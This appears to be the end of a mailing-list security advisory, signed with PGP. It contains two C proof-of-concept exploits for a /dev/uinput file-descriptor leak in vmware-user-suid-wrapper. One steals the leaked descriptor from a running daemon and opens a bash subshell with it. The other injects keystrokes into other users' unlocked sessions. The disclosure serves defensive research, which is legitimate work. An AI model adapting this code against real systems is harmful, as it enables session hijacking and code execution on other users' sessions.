> 	printf("Executing sub shell which will inherit the snatched file descrip=
tor %d (check /proc/self/fd)\n", snatched_fd);
> 	exec_prog("/bin/bash");
> }
>=20
> int main(int argc, const char **argv) {
> 	const char *snatch_fd_path =3D argc =3D=3D 2 ? argv[1] : "/dev/uinput";
>=20
> 	while (true) {
>=20
> 		collect_wrapper(); // collect possibly still existing child
> 		prepare_wrapper(); // start a new one
>=20
> 		pid_t daemon_pid =3D find_daemon();
> 		if (daemon_pid < 0)
> 			continue;
>=20
> 		int snatch_res =3D try_snatch_fd(daemon_pid, snatch_fd_path);
>=20
> 		if (snatch_res < 0) {
> 			continue;
> 		}
>=20
> 		collect_wrapper();
> 		run_subshell(snatch_res);
> 		return 1;
> 	}
> }

> /*
>  * Matthias Gerstner (matthias.gerstner@suse.de)
>  *
>  * 2023-07-24
>  *
>  * Proof of concept program that shows how to inject arbitrary data from a
>  * virtual input device if the caller has an open file descriptor for
>  * /dev/uinput already open.
>  *
>  * This is based on the example found in the kernel documentation tree
>  * "Documentation/input/uinput.rst".
>  *
>  * The keystrokes generated in this program can reach any local users log=
in
>  * consoles or graphical session and therefore can serve for arbitrary co=
de
>  * execution if any sessions are currently running unlocked on a host.
>  *
>  * This shows the security impact of the /dev/uinput file descriptor leak=
 in
>  * the vmware-user-suid-wrapper.
>  */
>=20
> #include <linux/uinput.h>
> #include <signal.h>
> #include <stdbool.h>
> #include <stdio.h>
> #include <string.h>
> #include <unistd.h>
>=20
> volatile bool keep_running =3D true;
>=20
> void sighandler(int) {
> 	keep_running =3D false;
> }
>=20
> static void emit(int fd, int type, int code, int val) {
> 	struct input_event ie;
>=20
> 	ie.type =3D type;
> 	ie.code =3D code;
> 	ie.value =3D val;
> 	/* timestamp values below are ignored */
> 	ie.time.tv_sec =3D 0;
> 	ie.time.tv_usec =3D 0;
>=20
> 	if (write(fd, &ie, sizeof(ie)) !=3D sizeof(ie)) {
> 		fprintf(stderr, "short/bad write in emit()\n");
> 	}
> }
>=20
> const int KEYS[] =3D {
> 	KEY_Y, KEY_O, KEY_U, KEY_SPACE,
> 	KEY_H, KEY_A, KEY_V, KEY_E, KEY_SPACE,
> 	KEY_B, KEY_E, KEY_E, KEY_N, KEY_SPACE,
> 	KEY_H, KEY_A, KEY_C, KEY_K, KEY_E, KEY_D, KEY_ENTER
> };
> const size_t NUM_KEYS =3D sizeof(KEYS)/sizeof(int);
>=20
> int main(int argc, const char **argv) {
>=20
> 	if (argc !=3D 2) {
> 		fprintf(stderr, "%s <uinput-fd-num>\n\nfile descriptor number required\=
n", argv[0]);
> 		return 1;
> 	}
>=20
> 	int ufd =3D -1;
>=20
> 	if (sscanf(argv[1], "%d", &ufd) !=3D 1) {
> 		fprintf(stderr, "%s: not a number\n", argv[1]);
> 		return 1;
> 	}
>=20
> 	ioctl(ufd, UI_SET_EVBIT, EV_KEY);
> 	for (size_t i =3D 0; i < NUM_KEYS; i++) {
> 		ioctl(ufd, UI_SET_KEYBIT, KEYS[i]);
> 	}
>=20
> 	struct uinput_setup usetup;
> 	memset(&usetup, 0, sizeof(usetup));
> 	usetup.id.bustype =3D BUS_USB;
> 	usetup.id.vendor =3D 0x1234; // sample vendor
> 	usetup.id.product =3D 0x5678; // sample product
> 	int print_res =3D snprintf(usetup.name, UINPUT_MAX_NAME_SIZE, "%s", "exp=
loit device");
>=20
> 	if (print_res < 0 || print_res >=3D UINPUT_MAX_NAME_SIZE) {
> 		fprintf(stderr, "device name print error\n");
> 		return 1;
> 	}
>=20
> 	ioctl(ufd, UI_DEV_SETUP, &usetup);
> 	int res =3D ioctl(ufd, UI_DEV_CREATE);
>=20
> 	if (res !=3D 0) {
> 		perror("ioctl(UI_DEV_CREATE");
> 		return 1;
> 	}
>=20
> 	signal(SIGTERM, sighandler);
> 	signal(SIGINT, sighandler);
>=20
> 	printf("Sleeping 3 seconds for input subsystem to settle\n");
> 	sleep(3);
>=20
> 	size_t key_index =3D 0;
>=20
> 	while (keep_running) {
> 		ioctl(ufd, UI_SET_KEYBIT, KEYS[key_index]);
> 		emit(ufd, EV_KEY, KEYS[key_index], 1);
> 		emit(ufd, EV_SYN, SYN_REPORT, 0);
> 		emit(ufd, EV_KEY, KEYS[key_index], 0);
> 		emit(ufd, EV_SYN, SYN_REPORT, 0);
>=20
> 		key_index++;
> 		if (key_index >=3D NUM_KEYS) {
> 			key_index =3D 0;
> 			printf("completed one iteration\n");
> 		}
>=20
> 		usleep(200000);
> 	}
>=20
> 	printf("Cleaning up\n");
> 	ioctl(ufd, UI_DEV_DESTROY);
> 	close(ufd);
>=20
> 	return 0;
> }




--1g8waAmHLPemVDvN
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iHUEABYKAB0WIQQyG9yfCrmO0LPSdG2gXq2+aa/JtQUCZWOexQAKCRCgXq2+aa/J
tTQ1AQD3hcDphCp55cpHBqKDrblTuMttJ/Ery+z0HH/mDNs4kAEAxaDL9feWJnim
qyIVCLnRbYgNDzMSV7GDQR5A2u6b5ww=
=W5PY
-----END PGP SIGNATURE-----

--1g8waAmHLPemVDvN--
